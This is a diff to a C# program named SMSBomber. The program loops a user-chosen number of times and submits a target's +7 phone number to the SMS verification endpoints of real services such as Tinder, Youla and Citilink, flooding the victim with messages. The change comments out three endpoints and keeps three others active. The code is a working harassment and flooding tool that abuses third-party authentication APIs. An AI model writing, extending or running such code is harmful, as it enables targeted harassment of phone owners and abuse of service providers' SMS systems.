@@ -89,9 +89,9 @@ namespace SMSBomber
             string number = tbNumber.Text;
             for (int i = 0; i < int.Parse(cblterations.Text); i++)
             {
-                Send("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", $"phone_number =+7{number}","Tinder");
-                Send("https://app.karusel.ru/api/v1/phone/", $"phone_number=+7{number}", "tinder");
-                Send("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", $"phone_number=+7{number}", "tinder");
+               //Send("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", $"phone_number =+7{number}","Tinder");
+               //Send("https://app.karusel.ru/api/v1/phone/", $"phone_number=+7{number}", "tinder");
+               //Send("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", $"phone_number=+7{number}", "tinder");
                 Send("https://api-prime.anytime.global/api/v2/auth/sendverificationcode", $"phone_number=+7{number}", "tinder");
                 Send("https://youla.ru/web-api/auth/request_code", $"phone_number +7{number}", "tinder");
                 Send("https://www.citilink.ru/registration/confirm/phone/+", $"phone_number=+7{number}", "tinder");
